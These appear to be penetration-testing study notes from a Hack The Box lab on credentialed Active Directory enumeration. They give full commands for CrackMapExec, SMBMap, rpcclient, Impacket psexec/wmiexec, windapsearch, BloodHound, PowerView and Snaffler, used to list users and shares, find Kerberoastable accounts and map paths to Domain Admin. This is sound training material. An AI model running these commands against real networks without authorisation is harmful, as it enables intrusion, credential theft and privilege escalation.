# Credentialed Enumeration

## 1.Credentialed Enumeration - from Linux

### CrackMapExec

```shell-session
crackmapexec -h
```

We can see that we can use the tool with MSSQL, SMB, SSH, and WinRM credentials. Let's look at our options for CME with the SMB protocol:

### CME Options (SMB)

```shell-session
crackmapexec smb -h
```

> CME offers a help menu for each protocol (i.e., `crackmapexec winrm -h`, etc.). Be sure to review the entire help menu and all possible options. For now, the flags we are interested in are:
>
> * -u Username `The user whose credentials we will use to authenticate`
> * -p Password `User's password`
> * Target (IP or FQDN) `Target host to enumerate` (in our case, the Domain Controller)
> * \--users `Specifies to enumerate Domain Users`
> * \--groups `Specifies to enumerate domain groups`
> * \--loggedon-users `Attempts to enumerate what users are logged on to a target, if any`
>
> We'll start by using the SMB protocol to enumerate users and groups. We will target the Domain Controller (whose address we uncovered earlier) because it holds all data in the domain database that we are interested in. Make sure you preface all commands with `sudo`.

### **CME - Domain User Enumeration**

```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

> We can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.

### CME - Domain Group Enumeration

```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

> the built-in groups on the Domain Controller, such as `Backup Operators`. We can begin to note down groups of interest. Take note of key groups like `Administrators`, `Domain Admins`, `Executives`, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting during our assessment.

### **CME - Logged On Users**

```shell-session
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

## **CME Share Searching**

### **Share Enumeration - Domain Controller**

```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

### **Spider\_plus**

```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

```shell-session
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json
```

## SMBMap

### SMBMap To Check Access

```shell-session
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

### Recursive List Of All Directories

```shell-session
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

## rpcclient

```bash
rpcclient -U "" -N 172.16.5.5
```

### SMB NULL Session with rpcclient

{% embed url="<https://academy.hackthebox.com/storage/modules/143/rpcclient.png>" %}

### **rpcclient Enumeration**

> While looking at users in rpcclient, you may notice a field called `rid:` beside each user. A [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects. To explain how this fits in, let's look at the examples below:
>
> * The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.
> * When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
> * So the domain user `htb-student` with a RID:\[0x457] Hex 0x457 would = decimal `1111`, will have a full user SID of: `S-1-5-21-3842939050-3880317879-2865463114-1111`.
> * This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.

### **RPCClient User Enumeration By RID**

```shell-session
rpcclient $> queryuser 0x457
```

### **Enumdomusers**

```shell-session
rpcclient $> enumdomusers

user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
user:[pfalcon] rid:[0x459]
user:[fanthony] rid:[0x45a]
user:[wdillard] rid:[0x45b]
user:[lbradford] rid:[0x45c]
user:[sgage] rid:[0x45d]
user:[asanchez] rid:[0x45e]
user:[dbranch] rid:[0x45f]
user:[ccruz] rid:[0x460]
user:[njohnson] rid:[0x461]
user:[mholliday] rid:[0x462]
```

## Impacket Toolkit

### Psexec.py

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125 
```

### wmiexec.py

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

## Windapsearch

> [Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries. It is present in our attack host's /opt/windapsearch/ directory.

```shell-session
windapsearch.py -h
```

### Windapsearch - Domain Admins

```shell-session
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

### **Windapsearch - Privileged Users**

```shell-session
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

> You'll notice that it performed mutations against common elevated group names in different languages. This output gives an example of the dangers of nested group membership, and this will become more evident when we work with BloodHound graphics to visualize this.

## Bloodhound.py

* <https://github.com/fox-it/BloodHound.py>

### BloodHound.py Options

```shell-session
bloodhound-python -h
```

### **Executing BloodHound.py**

> the tool accepts various collection methods with the `-c` or `--collectionmethod` flag. We can retrieve specific data such as user sessions, users and groups, object properties, ACLS, or select `all` to gather as much data as possible. Let's run it this way.

```shell-session
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```

### **Viewing the Results**

```shell-session
ls

20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json
```

### Upload the Zip File into the BloodHound GUI

```
sudo neo4j start
```

**Uploading the Zip File**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FlqzGRiwY4VDKLAxK8RGk%2Fimage.png?alt=media&amp;token=be16bd6c-d05c-4fa1-9adb-706ae93c0abc" alt=""><figcaption></figcaption></figure>

### **Searching for Relationships**

* <https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/>

we can use the built-in `Path Finding` queries on the `Analysis tab` on the `Left` side of the window.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FpncMVyZIOpCFEokUooB6%2Fimage.png?alt=media&amp;token=16d9b946-8613-4be5-a650-7c013cbd0970" alt=""><figcaption></figcaption></figure>

> `Find Shortest Paths To Domain Admins`. It will give us any logical paths it finds through users/groups/hosts/ACLs/GPOs, etc., relationships that will likely allow us to escalate to Domain Administrator privileges or equivalent.&#x20;

* <https://wadcoms.github.io/>

## 2.Credentialed Enumeration - from Windows

## ActiveDirectory PowerShell

run `Import-Module ActiveDirectory` to load it for use.

### **Discover Modules**

```powershell-session
PS C:\htb> Get-Module
```

### Load ActiveDirectory Module

```powershell-session
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module
```

### Get Domain Info

```powershell-session
PS C:\htb> Get-ADDomain
```

### Get-ADUser

We will be filtering for accounts with the `ServicePrincipalName` property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack

```powershell-session
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### **Checking For Trust Relationships**

```powershell-session
PS C:\htb> Get-ADTrust -Filter *
```

> This cmdlet will print out any trust relationships the domain has.

### Group Enumeration

```powershell-session
PS C:\htb> Get-ADGroup -Filter * | select name

name
----
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
```

### Detailed Group Info

```powershell-session
PS C:\htb> Get-ADGroup -Identity "Backup Operators"
```

> Now that we know more about the group, let's get a member

### Group Membership

```powershell-session
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
```

> We can see that one account, `backupagent`, belongs to this group. It is worth noting this down because if we can take over this service account through some attack, we could use its membership in the Backup Operators group to take over the domain.&#x20;

## PowerView

Let's examine some of PowerView's capabilities and see what data it returns. The table below describes some of the most useful functions PowerView offers.

| **Command**                         | **Description**                                                                            |
| ----------------------------------- | ------------------------------------------------------------------------------------------ |
| `Export-PowerViewCSV`               | Append results to a CSV file                                                               |
| `ConvertTo-SID`                     | Convert a User or group name to its SID value                                              |
| `Get-DomainSPNTicket`               | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account          |
| **Domain/LDAP Functions:**          |                                                                                            |
| `Get-Domain`                        | Will return the AD object for the current (or specified) domain                            |
| `Get-DomainController`              | Return a list of the Domain Controllers for the specified domain                           |
| `Get-DomainUser`                    | Will return all users or specific user objects in AD                                       |
| `Get-DomainComputer`                | Will return all computers or specific computer objects in AD                               |
| `Get-DomainGroup`                   | Will return all groups or specific group objects in AD                                     |
| `Get-DomainOU`                      | Search for all or specific OU objects in AD                                                |
| `Find-InterestingDomainAcl`         | Finds object ACLs in the domain with modification rights set to non-built in objects       |
| `Get-DomainGroupMember`             | Will return the members of a specific domain group                                         |
| `Get-DomainFileServer`              | Returns a list of servers likely functioning as file servers                               |
| `Get-DomainDFSShare`                | Returns a list of all distributed file systems for the current (or specified) domain       |
| **GPO Functions:**                  |                                                                                            |
| `Get-DomainGPO`                     | Will return all GPOs or specific GPO objects in AD                                         |
| `Get-DomainPolicy`                  | Returns the default domain policy or the domain controller policy for the current domain   |
| **Computer Enumeration Functions:** |                                                                                            |
| `Get-NetLocalGroup`                 | Enumerates local groups on the local or a remote machine                                   |
| `Get-NetLocalGroupMember`           | Enumerates members of a specific local group                                               |
| `Get-NetShare`                      | Returns open shares on the local (or a remote) machine                                     |
| `Get-NetSession`                    | Will return session information for the local (or a remote) machine                        |
| `Test-AdminAccess`                  | Tests if the current user has administrative access to the local (or a remote) machine     |
| **Threaded 'Meta'-Functions:**      |                                                                                            |
| `Find-DomainUserLocation`           | Finds machines where specific users are logged in                                          |
| `Find-DomainShare`                  | Finds reachable shares on domain machines                                                  |
| `Find-InterestingDomainShareFile`   | Searches for files matching specific criteria on readable shares in the domain             |
| `Find-LocalAdminAccess`             | Find machines on the local domain where the current user has local administrator access    |
| **Domain Trust Functions:**         |                                                                                            |
| `Get-DomainTrust`                   | Returns domain trusts for the current domain or a specified domain                         |
| `Get-ForestTrust`                   | Returns all forest trusts for the current forest or a specified forest                     |
| `Get-DomainForeignUser`             | Enumerates users who are in groups outside of the user's domain                            |
| `Get-DomainForeignGroupMember`      | Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping`            | Will enumerate all trusts for the current domain and any others seen.                      |

### **Domain User Information**

```powershell-session
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

### **Recursive Group Membership**

```powershell-session
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

> Above we performed a recursive look at the `Domain Admins` group to list its members. Now we know who to target for potential elevation of privileges. Like with the AD PowerShell module, we can also enumerate domain trust mappings.

### Trust Enumeration

```powershell-session
PS C:\htb> Get-DomainTrustMapping
```

> We can use the [Test-AdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/) function to test for local admin access on either the current machine or a remote one.

### Testing for Local Admin Access

```powershell-session
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

### **Finding Users With SPN Set**

```powershell-session
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

## SharpView

```powershell-session
PS C:\htb> .\SharpView.exe Get-DomainUser -Help
```

```powershell-session
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity <user>
```

## Shares

> Shares allow users on a domain to quickly access information relevant to their daily roles and share content with their organization. When set up correctly, domain shares will require a user to be domain joined and required to authenticate when accessing the system. Permissions will also be in place to ensure users can only access and see what is necessary for their daily role. Overly permissive shares can potentially cause accidental disclosure of sensitive information, especially those containing medical, legal, personnel, HR, data, etc. In an attack, gaining control over a standard domain user who can access shares such as the IT/infrastructure shares could lead to the disclosure of sensitive data such as configuration files or authentication files like SSH keys or passwords stored insecurely. We want to identify any issues like these to ensure the customer is not exposing any data to users who do not need to access it for their daily jobs and that they are meeting any legal/regulatory requirements they are subject to (HIPAA, PCI, etc.). We can use PowerView to hunt for shares and then help us dig through them or use various manual commands to hunt for common strings such as files with `pass` in the name. This can be a tedious process, and we may miss things, especially in large environments. Now, let's take some time to explore the tool `Snaffler` and see how it can aid us in identifying these issues more accurately and efficiently.

### Snaffler

```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

### **Snaffler in Action**

```powershell-session
PS C:\htb> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
```

## BloodHound

```powershell-session
PS C:\htb>  .\SharpHound.exe --help
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
```

### **Unsupported Operating Systems**

> We can run the query `Find Computers where Domain Users are Local Admin` to quickly see if there are any hosts where all users have local admin rights. If this is the case, then any account we control can typically be used to access the host(s) in question, and we may be able to retrieve credentials from memory or find other sensitive data.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FXwV4AQvMGMQHlOKdyk0P%2Fimage.png?alt=media&amp;token=ad731136-454c-4b60-a260-a400e123fa7f" alt=""><figcaption></figcaption></figure>

### **Local Admins**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F6IWCAf4eV0lK4HiUCxRK%2Fimage.png?alt=media&amp;token=ff00a8e3-451f-4c4d-b4c6-51c658ed899c" alt=""><figcaption></figcaption></figure>

* <https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/>
